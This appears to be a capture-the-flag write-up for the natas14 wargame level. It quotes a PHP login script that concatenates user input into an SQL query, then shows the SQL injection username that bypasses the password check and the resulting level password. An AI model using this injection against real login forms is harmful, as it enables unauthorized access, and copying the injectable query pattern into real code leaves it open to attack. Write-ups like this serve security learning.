Here's come the SQL exploitation:
```php
<?php
if(array_key_exists("username", $_REQUEST)) {
	$link = mysqli_connect('localhost', 'natas14', '<censored>');
	mysqli_select_db($link, 'natas14');
	
	$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
	if(array_key_exists("debug", $_GET)) {
		echo "Executing query: $query<br>";       }          if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
		echo "Successful login! The password for natas15 is <censored><br>";
	} else {
		echo "Access denied!<br>";
	}
mysqli_close($link);
} else {
?>
```

The `$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";` can definitely be used for SQL injection

This is checking for the correct username and password inside the sql query. What we can do is try to comment out the password checking part, that way, the sql query will be just a simple lookup query.

So in the username input field, I inputed this: `natas15" #` and I inputed some random strings into the password as it doesn't matter what my password input is. We need the quote at the end of the username so as to close up the string, or else the query won't work.

The output:
```
Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
```